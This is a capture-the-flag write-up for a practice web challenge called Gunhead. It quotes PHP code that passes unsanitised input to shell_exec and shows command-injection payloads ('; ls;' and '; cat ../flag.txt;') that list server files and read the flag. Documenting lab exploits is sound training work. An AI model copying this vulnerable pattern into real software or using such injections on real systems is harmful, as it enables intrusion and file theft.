# Gunhead (very easy)
## Description
During Pandora's training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable. With the situation escalating rapidly, Pandora used her hacking skills to infiltrate the managing system of Gunhead and urgently needs to take it down.

## Initial Thoughts
Looking at the landing page there isn't much going on. There are 3 options on the panel.
1. Status
2. Needs 
3. Commamd (interesting)
Taking a look at command I see that we are able to ping devices.

## Close look at ping command
In the source code I see we can make a POST request to /api/ping. All the application does is ensure its in a readable format (json).

From there it gets directly passed to this function and we see this comment.
```
public function getOutput()
    {
        # Do I need to sanitize user input before passing it to shell_exec?
        return shell_exec('ping -c 3 '.$this->ip);
    }
```
With that I know I can do some remote execution.

## Payload
I check out the Command feature and try to add another command at the end.
```
PING 1 (0.0.0.1): 56 data bytes
Router.php
controllers
index.php
models
static
views
> /ping 1; ls;
```
and it works! I was able to see the files in the current directory on the server.

All it took from there was
`/ping 1; cat ../flag.txt;`
To get the flag